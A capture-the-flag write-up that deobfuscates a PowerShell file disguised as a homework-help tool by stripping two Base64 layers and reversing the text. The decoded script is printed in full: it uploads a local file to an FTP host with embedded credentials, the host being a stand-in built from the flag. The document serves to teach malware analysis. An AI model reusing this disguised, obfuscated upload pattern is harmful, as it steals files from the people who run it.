## Suspicious script

I was on a site looking for homework help. They offer this tool that I installed and they suggest running it to help solve my assignment. The file ends in .ps1 and I am unfamiliar with it. Can you check it out for me?

The flag starts with DawgCTF{...}

## Solution

Opening homeworkHelper.ps1, you can see a long string of what seems to be Base64 encoded text.

```JAB7ACEAfQA9AFsAQwBIAGEAcgBdADEAMAA1ADsAJABhAD0AWwBTAHkAUwBUAEUAbQAuAH . . . ACIAJAB7ACEAfQBlACQAewBAAH0AIgApAA```

Decoding this string gives you even more Base64-encoded text:

```
fQB0AGkAeABlAHsAaABjAHQAYQBjAH0AOwApAEYAJAAgACwAaQByAHUAJAAoAGUAbABpAEYAZABhAG8AbABwAFUALgBsAGMAdwAkADsAcAB0AGYAJAAgAHQAcwBpAEwAdABuAGUAbQB1AGcAcgBBAC0AIABpAHIAVQAuAG0AZQB0AHMAeQBTACAAZQBtAGEATgBlAHAAeQBUAC0AIAB0AGMAZQBqAGIATwAtAHcAZQBOAD0AaQByAHUAJAA7AHQAbgBlAGkAbABDAGIAZQBXAC4AdABlAE4ALgBtAGUAdABzAHkAUwAgAGUA

bQBhAE4AZQBwAHkAVAAtACAAdABjAGUAagBiAE8ALQB3AGUATgA9AGwAYwB3ACQAOwAiAHAAaQB6AC4AcwBzAGEAcAAvAG4AaQAvAH0AIQA1AHQAcAAxAGMANQBfAGQAZQBwAHAANAByAFcAewBGAFQAQwBnAHcAYQBEAEAAeQByAGEAYwBzADoAcgBlAHMAdQAvAC8AOgBwAHQAZgAiAD0AcAB0AGYAJAA7ADYAMQAxAF0AcgBhAEgAQwBbACsAMAAyADEAXQByAGEASABDAFsAKwA2ADEAMQBdAHIAYQBIAEMAWwArADYA

NABdAHIAYQBIAEMAWwArADUAMgAxAF0AcgBhAEgAQwBbACsANgAxADEAXQByAGEASABDAFsAKwAyADEAMQBdAHIAYQBIAEMAWwArADkANABdAHIAYQBIAEMAWwArADQAMQAxAF0AcgBhAEgAQwBbACsAOQA5AF0AcgBhAEgAQwBbACsAMwA1AF0AcgBhAEgAQwBbACsANQA5AF0AcgBhAEgAQwBbACsANQAxADEAXQByAGEASABDAFsAKwAyADEAMQBdAHIAYQBIAEMAWwArADUAOQBdAHIAYQBIAEMAWwArADAAMAAxAF0A

cgBhAEgAQwBbACsAMQA1AF0AcgBhAEgAQwBbACsAMAAwADEAXQByAGEASABDAFsAKwA4ADQAXQByAGEASABDAFsAKwA5ADkAXQByAGEASABDAFsAKwAwADEAMQBdAHIAYQBIAEMAWwArADEANQBdAHIAYQBIAEMAWwArADMAMgAxAF0AcgBhAEgAQwBbACsANQAxADEAXQByAGEASABDAFsAKwA5ADEAMQBdAHIAYQBIAEMAWwArADcAOQBdAHIAYQBIAEMAWwArADAAOABdAHIAYQBIAEMAWwArADIAOQBdAHIAYQBIAEMA

WwArADgANQBdAHIAYQBIAEMAWwArADcANgBdAHIAYQBIAEMAWwA9AEYAJAB7AHkAcgB0AA==
```

Decoding THAT string will give you this:

`}tixe{hctac};)F$ ,iru$(eliFdaolpU.lcw$;ptf$ tsiLtnemugrA- irU.metsyS emaNepyT- tcejbO-weN=iru$;tneilCbeW.teN.metsyS emaNepyT- tcejbO-weN=lcw$;"piz.ssap/ni/}!5tp1c5_depp4rW{FTCgwaD@yracs:resu//:ptf"=ptf$;611]raHC[+021]raHC[+611]raHC[+64]raHC[+521]raHC[+611]raHC[+211]raHC[+94]raHC[+411]raHC[+99]raHC[+35]raHC[+59]raHC[+511]raHC[+211]raHC[+59]raHC[+001]raHC[+15]raHC[+001]raHC[+84]raHC[+99]raHC[+011]raHC[+15]raHC[+321]raHC[+511]raHC[+911]raHC[+79]raHC[+08]raHC[+29]raHC[+85]raHC[+76]raHC[=F${yrt`

This text seems to be in reverse, so reversing it gives this: 

`try{$F=[CHar]67+[CHar]58+[CHar]92+[CHar]80+[CHar]97+[CHar]119+[CHar]115+[CHar]123+[CHar]51+[CHar]110+[CHar]99+[CHar]48+[CHar]100+[CHar]51+[CHar]100+[CHar]95+[CHar]112+[CHar]115+[CHar]95+[CHar]53+[CHar]99+[CHar]114+[CHar]49+[CHar]112+[CHar]116+[CHar]125+[CHar]46+[CHar]116+[CHar]120+[CHar]116;$ftp="ftp://user:scary@DawgCTF{Wr4pped_5c1pt5!}/in/pass.zip";$wcl=New-Object -TypeName System.Net.WebClient;$uri=New-Object -TypeName System.Uri -ArgumentList $ftp;$wcl.UploadFile($uri, $F);}catch{exit}`

In this text, the flag is present.

FLAG: `DawgCTF{Wr4pped_5c1pt5!}`
